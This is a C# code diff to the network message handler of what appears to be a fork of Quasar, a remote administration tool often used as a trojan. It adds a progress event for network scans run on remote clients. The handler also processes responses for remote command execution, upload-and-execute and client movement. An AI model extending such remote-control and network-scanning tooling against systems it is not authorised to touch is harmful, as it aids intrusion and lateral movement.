@@ -33,11 +33,22 @@ namespace Quasar.Server.Messages
         }
     }
 
+    public class NetworkScanProgressEventArgs : EventArgs
+    {
+        public DoNetworkScanProgress Packet { get; set; }
+        public NetworkScanProgressEventArgs(DoNetworkScanProgress packet)
+        {
+            this.Packet = packet;
+        }
+    }
+
     public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
     {
         public event EventHandler<NetworkScanResponseEventArgs> NetworkScanResponseEvent;
 
         public event EventHandler<InterfaceScanResponseEventArgs> InterfaceScanResponseEvent;
+
+        public event EventHandler<NetworkScanProgressEventArgs> NetworkScanProgressEvent;
 
         private readonly Client _client;
 
@@ -51,7 +62,7 @@ namespace Quasar.Server.Messages
                                                              message is DoClientMovementResponse ||
                                                              message is DoRemoteCommandExecuteResponse ||
                                                              message is DoUploadAndExecuteResponse ||
-                                                             message is NetworkScanProgress;
+                                                             message is DoNetworkScanProgress;
 
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
 
@@ -63,6 +74,11 @@ namespace Quasar.Server.Messages
         protected virtual void OnInterfaceScanResponse(InterfaceScanResponseEventArgs e)
         {
             InterfaceScanResponseEvent?.Invoke(this, e);
+        }
+
+        protected virtual void OnNetworkScanProgress(NetworkScanProgressEventArgs e)
+        {
+            NetworkScanProgressEvent?.Invoke(this, e);
         }
 
         public override void Execute(ISender sender, IMessage message)
@@ -84,7 +100,7 @@ namespace Quasar.Server.Messages
                 case DoUploadAndExecuteResponse uploadResp:
                     Execute(sender, uploadResp);
                     break;
-                case NetworkScanProgress progResp:
+                case DoNetworkScanProgress progResp:
                     Execute(sender, progResp);
                     break;
             }
@@ -140,11 +156,9 @@ namespace Quasar.Server.Messages
             MessageBox.Show("Received Upload and Execute Response!");
         }
 
-        private void Execute(ISender client, NetworkScanProgress message)
+        private void Execute(ISender client, DoNetworkScanProgress message)
         {
-            MessageBox.Show($"Received Progress Report: {message.InterfaceIndex} / {message.Interfaces} => {message.CurrentAddress} / {message.Addresses} : {Math.Round((double)(message.CurrentAddress / message.Addresses), 4)}%");
+            OnNetworkScanProgress(new NetworkScanProgressEventArgs(message));
         }
-
-        // Ok, we need to allow the server to select what interfaces to scan, combo box maybe?
     }
 }
